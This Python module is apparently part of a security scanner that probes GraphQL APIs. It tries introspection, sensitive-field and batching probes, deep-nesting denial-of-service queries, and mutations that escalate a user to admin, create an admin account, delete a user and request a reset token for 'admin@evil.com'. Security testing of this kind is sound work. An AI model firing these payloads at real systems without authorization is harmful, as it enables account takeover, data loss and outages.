"""GraphQL API scanner for Titan Scanner."""


from __future__ import annotations

import json
from typing import Any

from titan.core.logger import get_logger
from titan.core.models import AttackType, Finding, Severity
from titan.verify import BaselineAnalyzer

logger = get_logger("graphql")



class GraphQLScanner:
    def __init__(self, payload_smith, fingerprint: dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint

    async def scan(self, context, target: str, api_url: str) -> list[Finding]:
        findings: list[Finding] = []

        # ── Engine 1: Introspection ─────────────────────────────────────
        introspection_queries = [
            "query IntrospectionQuery { __schema { types { name } } }",
            "query { __type(name: \"Query\") { name fields { name type { name } } } }",
            "query { __type(name: \"Mutation\") { name fields { name type { name } } } }",
            "query { __type(name: \"Subscription\") { name fields { name type { name } } } }",
            "query { __schema { queryType { name } mutationType { name } subscriptionType { name } } }",
            "query { __schema { directives { name locations } } }",
            "query { __type(name: \"User\") { name fields { name type { name } args { name type { name } } } } }",
            "query { __type(name: \"Query\") { fields { name args { name type { name } } } } }",
            "query { __type(name: \"User\") { enumValues { name } } }",
            "query { __type(name: \"User\") { inputFields { name type { name } } } }",
            "query { __schema { types { name enumValues { name } } } }",
        ]

        for iq in introspection_queries:
            try:
                resp = await context.request.post(
                    api_url,
                    data=json.dumps({"query": iq}),
                    headers={"Content-Type": "application/json", "Referer": target},
                    timeout=10000,
                )
                body = await resp.text()
                if "__schema" in body or "__type" in body:
                    findings.append(Finding(
                        target=target,
                        url=api_url,
                        method="POST",
                        param="query",
                        location="body",
                        payload=f"GraphQL Introspection: {iq[:80]}",
                        attack_type=AttackType.INFO_LEAK,
                        severity=Severity.MEDIUM,
                        verified=True,
                        confidence=0.95,
                        status=resp.status,
                        headers=dict(resp.headers),
                        body=body[:2000],
                        diffs=["graphql:introspection_enabled"],
                    ))
                    break
            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        # ── Engine 2: Field suggestion / enum exhaustion ────────────────
        field_probes = [
            '{"query": "{ user { id } }"}',
            '{"query": "{ user { email } }"}',
            '{"query": "{ user { password } }"}',
            '{"query": "{ user { role } }"}',
            '{"query": "{ users { id email } }"}',
            '{"query": "{ admin { id } }"}',
            '{"query": "{ secret { id } }"}',
            '{"query": "{ internal { id } }"}',
            '{"query": "{ debug { id } }"}',
            '{"query": "{ config { id } }"}',
            '{"query": "{ __schema { types { name fields { name } } } }"}',
        ]

        for probe in field_probes:
            try:
                test_data = json.loads(probe)
                resp = await context.request.post(
                    api_url,
                    data=json.dumps(test_data),
                    headers={"Content-Type": "application/json", "Referer": target},
                    timeout=10000,
                )
                body = await resp.text()

                baseline_body = ""
                try:
                    baseline_resp = await context.request.post(
                        api_url,
                        data=json.dumps({"query": "{ __schema { types { name } } }"}),
                        headers={"Content-Type": "application/json", "Referer": target},
                        timeout=10000,
                    )
                    baseline_body = await baseline_resp.text()
                except Exception as exc:
                    logger.debug(f"suppressed exception: {exc}")
                    pass

                diffs = BaselineAnalyzer.diff_responses(baseline_body, body, probe)

                if diffs or resp.status >= 500:
                    sev = Severity.MEDIUM if resp.status >= 500 else Severity.LOW
                    findings.append(Finding(
                        target=target,
                        url=api_url,
                        method="POST",
                        param="query",
                        location="body",
                        payload=probe[:200],
                        attack_type=AttackType.INFO_LEAK,
                        severity=sev,
                        verified=bool(diffs),
                        confidence=0.7 if diffs else 0.4,
                        status=resp.status,
                        headers=dict(resp.headers),
                        body=body[:2000],
                        diffs=diffs,
                    ))
            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        # ── Engine 3: Batching / aliasing abuse ─────────────────────────
        batch_probes = [
            json.dumps([
                {"query": "{ user(id: \"1\") { id } }"},
                {"query": "{ user(id: \"2\") { id } }"},
                {"query": "{ user(id: \"3\") { id } }"},
            ]),
            json.dumps([
                {"query": "query A { user(id: \"1\") { id } }"},
                {"query": "query B { user(id: \"2\") { id } }"},
            ]),
            json.dumps([
                {"query": "{ user: user(id: \"1\") { id } }"},
                {"query": "{ user: user(id: \"2\") { id } }"},
            ]),
        ]

        for batch in batch_probes:
            try:
                resp = await context.request.post(
                    api_url,
                    data=batch,
                    headers={"Content-Type": "application/json", "Referer": target},
                    timeout=10000,
                )
                body = await resp.text()

                baseline_body = ""
                try:
                    baseline_resp = await context.request.post(
                        api_url,
                        data=json.dumps({"query": "{ __schema { types { name } } }"}),
                        headers={"Content-Type": "application/json", "Referer": target},
                        timeout=10000,
                    )
                    baseline_body = await baseline_resp.text()
                except Exception as exc:
                    logger.debug(f"suppressed exception: {exc}")
                    pass

                diffs = BaselineAnalyzer.diff_responses(baseline_body, body, batch)
                if diffs or resp.status >= 500:
                    findings.append(Finding(
                        target=target,
                        url=api_url,
                        method="POST",
                        param="query",
                        location="body",
                        payload=f"GraphQL batch/alias probe ({len(json.loads(batch))} ops)",
                        attack_type=AttackType.INFO_LEAK,
                        severity=Severity.MEDIUM if resp.status >= 500 else Severity.LOW,
                        verified=bool(diffs),
                        confidence=0.6 if diffs else 0.4,
                        status=resp.status,
                        headers=dict(resp.headers),
                        body=body[:2000],
                        diffs=diffs,
                    ))
            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        # ── Engine 4: AI-mutated payloads ───────────────────────────────
        # payload_smith is optional — without it the scanner still runs
        # engines 1-3 and 5.
        if self.payload_smith is not None:
            context_data = {
                "fingerprint": self.fingerprint,
                "attack_type": "graphql",
                "param_type": "json",
                "location": "body",
            }
            base_payloads = [
                '{"query": "{ __schema { types { name } } }"}',
                '{"query": "{ user { id email password } }"}',
                '{"query": "mutation { createUser(input: {name: \\"test\\"}) { user { id } } }"}',
            ]
            payloads = await self.payload_smith.mutate(base_payloads, context_data)

            for payload in payloads:
                try:
                    test_data = json.loads(payload)
                    resp = await context.request.post(
                        api_url,
                        data=json.dumps(test_data),
                        headers={"Content-Type": "application/json", "Referer": target},
                        timeout=10000,
                    )
                    body = await resp.text()

                    baseline_body = ""
                    try:
                        baseline_resp = await context.request.post(
                            api_url,
                            data=json.dumps({"query": "{ __schema { types { name } } }"}),
                            headers={"Content-Type": "application/json", "Referer": target},
                            timeout=10000,
                        )
                        baseline_body = await baseline_resp.text()
                    except Exception as exc:
                        logger.debug(f"suppressed exception: {exc}")
                        pass

                    diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
                    if diffs or resp.status >= 500:
                        findings.append(Finding(
                            target=target,
                            url=api_url,
                            method="POST",
                            param="query",
                            location="body",
                            payload=payload[:200],
                            attack_type=AttackType.INFO_LEAK,
                            severity=Severity.MEDIUM if resp.status >= 500 else Severity.LOW,
                            verified=bool(diffs),
                            confidence=0.6 if diffs else 0.4,
                            status=resp.status,
                            headers=dict(resp.headers),
                            body=body[:2000],
                            diffs=diffs,
                        ))
                except Exception as exc:
                    logger.debug(f"variant failed, continuing: {exc}")
                    continue

        # ── Engine 5: Query depth abuse ───────────────────────────────
        # (name, query, severity, confidence). A 400 "depth limit exceeded"
        # reply means the server HAS a depth guard — not a finding.
        depth_payloads = [
            ("depth_10",
             "{user{friends{friends{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}}}",
             Severity.HIGH, 0.5),
            ("depth_20",
             "{user{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}}}}}}}}}}}",
             Severity.CRITICAL, 0.6),
            ("circular_query",
             "{user{__typename ...on User{friends{__typename ...on User{name}}}}}",
             Severity.HIGH, 0.5),
        ]
        for name, query, sev, conf in depth_payloads:
            try:
                resp = await context.request.post(
                    api_url,
                    data=json.dumps({"query": query}),
                    headers={"Content-Type": "application/json", "Referer": target},
                    timeout=10000,
                )
                body = await resp.text()
                depth_hit = resp.status == 200 and '"data"' in body
                crash = resp.status >= 500
                if depth_hit or crash:
                    findings.append(Finding(
                        target=target,
                        url=api_url,
                        method="POST",
                        param="query",
                        location="body",
                        payload=f"GraphQL depth attack: {name}",
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=Severity.HIGH if crash else sev,
                        verified=False,
                        confidence=0.8 if crash else conf,
                        status=resp.status,
                        headers=dict(resp.headers),
                        body=body[:2000],
                        diffs=[f"graphql:{name}"],
                        notes="deep query processed" if depth_hit else "server crashed under depth — confirm manually",
                    ))
            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        # ── Engine 6: Mutation abuse ─────────────────────────────────
        # (name, query, severity, confidence). A 200 with data and no
        # errors means the mutation was ACCEPTED — the actual effect
        # (role change, deletion) must be confirmed by the operator.
        # Deletion targets a nonexistent id and creation uses an
        # identifiable test address to minimise collateral damage.
        mutation_payloads = [
            ("role_escalation",
             'mutation{updateUser(id:1,role:"admin"){id role}}',
             Severity.CRITICAL, 0.7),
            ("password_reset",
             'mutation{resetPassword(email:"admin@evil.com"){token}}',
             Severity.CRITICAL, 0.6),
            ("user_creation",
             'mutation{createUser(email:"titan_scan_test@invalid.local",password:"Tt5n$9xQz",role:"admin"){id}}',
             Severity.CRITICAL, 0.7),
            ("data_deletion",
             "mutation{deleteUser(id:999999){success}}",
             Severity.CRITICAL, 0.6),
        ]
        for name, query, sev, conf in mutation_payloads:
            try:
                resp = await context.request.post(
                    api_url,
                    data=json.dumps({"query": query}),
                    headers={"Content-Type": "application/json", "Referer": target},
                    timeout=10000,
                )
                body = await resp.text()
                accepted = resp.status == 200 and '"data"' in body and '"errors"' not in body
                if accepted:
                    findings.append(Finding(
                        target=target,
                        url=api_url,
                        method="POST",
                        param="mutation",
                        location="body",
                        payload=f"GraphQL mutation abuse: {name}",
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=sev,
                        verified=False,
                        confidence=conf,
                        status=resp.status,
                        headers=dict(resp.headers),
                        body=body[:2000],
                        diffs=[f"graphql:{name}"],
                        notes="mutation accepted without error — confirm real-world effect manually",
                    ))
            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        return findings
